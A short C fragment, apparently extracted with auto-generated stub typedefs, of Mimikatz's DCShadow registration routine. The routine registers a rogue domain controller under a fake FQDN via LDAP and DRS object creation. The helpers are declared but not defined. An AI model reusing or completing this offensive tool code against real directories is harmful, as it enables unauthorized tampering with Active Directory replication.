
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_6__ ;
typedef struct TYPE_7__ TYPE_1__ ;


struct TYPE_8__ {int isInstanceId; } ;
struct TYPE_7__ {TYPE_6__ mimiDc; int szFakeFQDN; } ;
typedef TYPE_1__* PDCSHADOW_DOMAIN_INFO ;
typedef int NTSTATUS ;


 scalar_t__ NT_SUCCESS (int ) ;
 int PRINT_ERROR (char*) ;
 int STATUS_SUCCESS ;
 int STATUS_UNSUCCESSFUL ;
 int kprintf (char*) ;
 scalar_t__ kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID (TYPE_1__*,int ,TYPE_6__*) ;
 int kuhl_m_lsadump_dcshadow_register_NTDSA (TYPE_1__*) ;
 scalar_t__ kuhl_m_lsadump_dcshadow_register_ldap (TYPE_1__*) ;

NTSTATUS kuhl_m_lsadump_dcshadow_register(PDCSHADOW_DOMAIN_INFO info)
{
 NTSTATUS status = STATUS_UNSUCCESSFUL;

 if(!info->mimiDc.isInstanceId)
 {
  if(kuhl_m_lsadump_dcshadow_register_ldap(info))
  {
   if(NT_SUCCESS(kuhl_m_lsadump_dcshadow_register_NTDSA(info)))
   {
    if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szFakeFQDN, &info->mimiDc))
     status = STATUS_SUCCESS;
    else PRINT_ERROR(L"Unable to get invocation Id\n");
   }
   else PRINT_ERROR(L"Unable to add object via Drs\n");
  }
 }
 else
 {
  kprintf(L"Already registered\n");
  status = STATUS_SUCCESS;
 }
 return status;
}
